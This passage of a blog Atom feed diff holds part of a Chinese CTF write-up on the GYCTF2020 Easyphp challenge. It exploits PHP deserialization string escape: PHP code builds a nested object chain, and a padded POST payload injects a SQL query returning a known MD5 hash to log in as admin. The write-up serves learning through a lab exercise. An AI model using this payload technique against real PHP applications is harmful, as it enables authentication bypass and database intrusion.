mp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;N;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;
+第二次反序列化就同理了：
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class Info&amp;#123;
+    public $age;
+    public $nickname;
+    public $CtrlCase;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;age = &amp;quot;1&amp;quot;;
+        $this-&amp;gt;nickname = &amp;quot;2&amp;quot;;
+        //$this-&amp;gt;CtrlCase=new dbCtrl();
+        //$this-&amp;gt;CtrlCase=new User();
+    &amp;#125;
+&amp;#125;
+class User
+&amp;#123;
+    public $id=&amp;quot;1&amp;quot;;
+    public $age;
+    public $nickname;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;age=&#39;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&#39;;
+        $this-&amp;gt;nickname=new Info();
+        //$this-&amp;gt;nickname-&amp;gt;CtrlCase=new User();
+    &amp;#125;
+&amp;#125;
+Class UpdateHelper&amp;#123;
+    public $sql;
+&amp;#125;
+
+class dbCtrl
+&amp;#123;
+    public $hostname=&amp;quot;127.0.0.1&amp;quot;;
+    public $dbuser=&amp;quot;root&amp;quot;;
+    public $dbpass=&amp;quot;root&amp;quot;;
+    public $database=&amp;quot;test&amp;quot;;
+    public $name=&amp;quot;admin&amp;quot;;
+    public $password=&amp;quot;1&amp;quot;;
+    public $mysqli;
+    public $token;
+    public $feng;
+    public function __construct()
+    &amp;#123;
+        $this-&amp;gt;feng=new UpdateHelper();
+        //$this-&amp;gt;token=&amp;quot;admin&amp;quot;;
+    &amp;#125;
+&amp;#125;
+$a=new Info();
+$a-&amp;gt;CtrlCase=new dbCtrl();
+$a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql=new User();
+$a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql-&amp;gt;nickname-&amp;gt;CtrlCase=new User();
+//var_dump($a-&amp;gt;CtrlCase-&amp;gt;feng-&amp;gt;sql-&amp;gt;nickname);
+//var_dump($a);
+echo serialize($a);
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;age=&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunionunionunionunionunionunionunionunionload1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:6:&amp;quot;dbCtrl&amp;quot;:9:&amp;#123;s:8:&amp;quot;hostname&amp;quot;;s:9:&amp;quot;127.0.0.1&amp;quot;;s:6:&amp;quot;dbuser&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:6:&amp;quot;dbpass&amp;quot;;s:4:&amp;quot;root&amp;quot;;s:8:&amp;quot;database&amp;quot;;s:4:&amp;quot;test&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:6:&amp;quot;mysqli&amp;quot;;N;s:5:&amp;quot;token&amp;quot;;N;s:4:&amp;quot;feng&amp;quot;;O:12:&amp;quot;UpdateHelper&amp;quot;:1:&amp;#123;s:3:&amp;quot;sql&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;O:4:&amp;quot;User&amp;quot;:3:&amp;#123;s:2:&amp;quot;id&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;age&amp;quot;;s:72:&amp;quot;select &amp;quot;1&amp;quot;,&amp;quot;c4ca4238a0b923820dcc509a6f75849b&amp;quot; from user where username=?&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;O:4:&amp;quot;Info&amp;quot;:3:&amp;#123;s:3:&amp;quot;age&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:8:&amp;quot;nickname&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:8:&amp;quot;CtrlCase&amp;quot;;N;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;#125;&amp;amp;username=admin&amp;amp;password=1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;最终成功得到 flag：&lt;/p&gt;
+&lt;p&gt;最终成功得到 flag：&lt;/p&gt;
+&lt;p&gt;参考链接：[&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlci9hcnRpY2xlL2RldGFpbHMvMTE0NTI1OTUx&#34;&gt;GYCTF2020] Easyphp-CSDN 博客&lt;/span&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="php反序列化" />
+        <category term="反序列化字符串逃逸" />
+        <updated>2024-08-06T04:05:13.000Z</updated>
     </entry>
     <entry>
         <id>http://odiws.github.io/2024/07/28/2020-Greatphp/</id>
